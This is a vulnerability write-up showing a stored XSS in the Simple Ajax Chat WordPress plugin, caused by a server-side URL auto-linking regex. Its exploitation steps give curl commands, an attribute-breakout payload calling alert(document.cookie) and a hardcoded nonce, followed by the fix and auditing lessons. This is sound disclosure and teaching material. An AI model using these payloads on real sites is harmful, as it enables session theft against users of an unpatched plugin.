# Worked Example: Simple Ajax Chat v20260811 — Stored XSS via preg_replace URL Auto-Linking

## Plugin
- **Slug:** `simple-ajax-chat`
- **Version:** 20260811 (latest, updated Aug 10-11 2026)
- **Installs:** 2,000+
- **CVEs:** Multiple existing CVEs for different parameters (CVE-2026-2987 'c' param, CVE-2024-1983 name field) — this is a **different vector**

## Vulnerability

**Type:** Unauthenticated Stored XSS
**File:** `simple-ajax-chat-form.php` lines 143-144
**CVSS 3.1:** 6.3 Medium — AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

### Vulnerable Code

```php
// Line 143: Regex uses \S* which matches double quotes
$pattern = "/(http|https|ftp|ftps)\:\/\/[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,3}(\/\S*)?/";
// Line 144: URL placed in href="\\0" without esc_url()
$chat_text = preg_replace($pattern, '<a rel="external nofollow" href="\\0" title="...">\\0</a>', $chat_text);
```

### Root Cause

1. Chat text is sanitized with `sanitize_text_field()` (line 131) which strips HTML tags but does NOT strip double quotes
2. The regex `\S*` matches any non-whitespace character including `"` double quotes
3. The matched URL is placed directly into `href="\\0"` without `esc_url()`
4. A double quote in the URL breaks out of the `href` attribute, enabling HTML attribute injection

### JavaScript vs Server-Side Regex Difference

The JavaScript auto-linking (in `resources/sac.php` line 199) uses a SAFE regex:
```javascript
var re = /((http|https|ftp):\/\/[^\s'\"\%]*)/gi;  // Excludes quotes!
```

But the server-side PHP regex (line 143) uses `\S*` which INCLUDES quotes. The initial page load uses the vulnerable server-side regex; AJAX updates use the safe JS regex. This is a common pattern — always check BOTH server-side and client-side auto-linking code.

## Exploitation

### Prerequisites
- `registered_only` option must be `false` (default) — allows unauthenticated chat submissions
- WordPress nonce (`sac_nonce`) is available in page HTML to unauthenticated visitors
- `sac_js_nonce` is a base64-encoded hardcoded nonce (not random)

### Step 1: Get the Nonce

```bash
curl -sL http://localhost/2026/08/11/chat-test/ | grep -oP 'sac_nonce.*?value="([^"]+)"' | head -1
```

### Step 2: Submit Chat with XSS Payload

```bash
curl -s -X POST \
  'http://localhost/wp-content/plugins/simple-ajax-chat/simple-ajax-chat-core.php' \
  -d 'sac_name=Attacker' \
  -d 'sac_chat=http://x.com/"onmouseover="alert(document.cookie)' \
  -d 'sac_verify=' \
  -d 'sac_lastID=1' \
  -d 'sac_no_js=1' \
  -d 'sac_nonce=<NONCE_FROM_STEP_1>' \
  -d 'sac_js_nonce=dFh5VjQ4ZXVwS1tnLDh1W01fbUldcF1B'
```

The `sac_js_nonce` is `base64_encode('tXyV48eupK[g,8u[M_mI]p]A')` — one of 10 hardcoded nonces in `simple-ajax-chat-core.php`.

**CRITICAL: No space after the double quote in the payload!**

The `\S*` regex matches any non-whitespace. A space terminates the match.

- **WORKS:** `http://x.com/"onmouseover="alert(document.cookie)` — no space after `"`
  - `\S*` matches `"onmouseover="alert(document.cookie)` as part of the URL
  - Entire string goes into `href="..."` → double quote breaks out → `onmouseover` becomes a new attribute → XSS

- **FAILS:** `http://x.com/" onmouseover="alert(document.cookie)` — space after `"`
  - `\S*` stops at the space → URL is only `http://x.com/"`
  - `onmouseover` is rendered as plain text OUTSIDE the `<a>` tag → no XSS

This is the #1 gotcha when exploiting the `\S*` preg_replace pattern class.

### Step 3: Verify XSS Renders

```bash
curl -sL http://localhost/2026/08/11/chat-test/ | grep onmouseover
```

**Rendered output:**
```html
<a rel="external nofollow" href="http://x.com/"onmouseover="alert(document.cookie)" title="Open link in new tab">...</a>
```

The browser parses this as:
- `href="http://x.com/"` — URL value
- `onmouseover="alert(document.cookie)"` — NEW HTML attribute (XSS!)

Any user who hovers over the link triggers `alert(document.cookie)`.

## Why This is NOT a Duplicate of Existing CVEs

| CVE | Parameter | Vector | Fixed In |
|-----|-----------|--------|----------|
| CVE-2024-1983 | Name field | Reflected without sanitization | 20240223 |
| CVE-2026-2987 | 'c' parameter | Stored XSS via different param | 20260217 |
| **This finding** | **Chat text** | **preg_replace URL auto-linking regex** | **Not fixed (v20260811)** |

The fix requires either:
- Change `\S*` to `[^\s'"%]` in the regex (matching the JS-side pattern)
- OR wrap the matched URL in `esc_url()` before placing in `href`

## Key Lessons

1. **`sanitize_text_field()` does NOT strip double quotes.** It strips HTML tags and whitespace but preserves `"`. When the sanitized value is later placed inside an HTML attribute, double quotes enable attribute breakout.

2. **Server-side and client-side URL auto-linking often use different regex patterns.** Always audit BOTH. The JS regex may exclude quotes while the PHP regex uses `\S*` which includes them.

3. **Hardcoded nonces are not security.** The `sac_js_nonce` is one of 10 base64-encoded strings hardcoded in the PHP file. Any attacker can extract and use them.

4. **`preg_replace` with `\\0` backreference into HTML attributes is a common XSS pattern.** Any plugin that auto-links URLs this way without `esc_url()` on the backreference is potentially vulnerable.
